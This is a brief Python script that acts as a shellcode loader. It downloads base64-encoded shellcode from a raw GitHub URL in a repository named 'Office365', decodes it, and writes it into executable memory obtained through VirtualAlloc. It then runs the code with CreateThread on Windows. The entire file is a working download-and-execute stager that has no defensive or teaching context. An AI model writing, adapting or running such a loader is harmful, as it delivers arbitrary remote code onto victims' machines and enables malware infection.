import urllib.request
import base64
import ctypes

url = 'https://raw.githubusercontent.com/wolfgangphelan994924/Office365/main/shellcode_b64.txt'
print('Downloading from:', url)

response = urllib.request.urlopen(url)
b64_content = response.read().decode('utf-8')
print('Downloaded', len(b64_content), 'characters')

shellcode = base64.b64decode(b64_content)
print('Decoded', len(shellcode), 'bytes')
print('Executing shellcode...')

# Allocate memory and execute shellcode
buf = ctypes.create_string_buffer(shellcode, len(shellcode))
addr = ctypes.windll.kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
ctypes.memmove(addr, buf, len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(None, 0, addr, None, 0, None)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
